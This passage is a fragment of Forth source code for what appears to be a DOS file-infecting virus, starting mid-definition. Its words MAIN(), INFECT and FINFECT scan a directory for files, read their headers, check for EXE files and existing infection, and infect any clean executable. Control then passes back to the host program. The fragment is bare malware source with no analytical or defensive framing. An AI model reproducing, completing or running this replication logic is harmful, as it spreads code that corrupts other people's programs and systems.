          DUP 0014 + @ IP_ ! 0016 + @ CS_ !
  HANDLE@ GET_FLEN SWAP DUP
  HEADER_ 4 + @ 1- 0200 * HEADER_ 2 + @ + =
  IF FINFECT_ CLOSE_FILE GO_PROG THEN CLOSE_FILE ;

: INFECT
    ?ALR IF CLOSE_FILE EXIT ELSE FINFECT THEN ;

: ERROR_ CARRY_ @ FALSE = ;

: MAIN()
   GO_PROG_PREV SET_DTA FIND_FIRST
   BEGIN
    OPEN_FILE READ_HEADER
    ?EXE IF INFECT THEN
    FIND_NEXT ERROR_ IF GO_PROG THEN
   AGAIN ;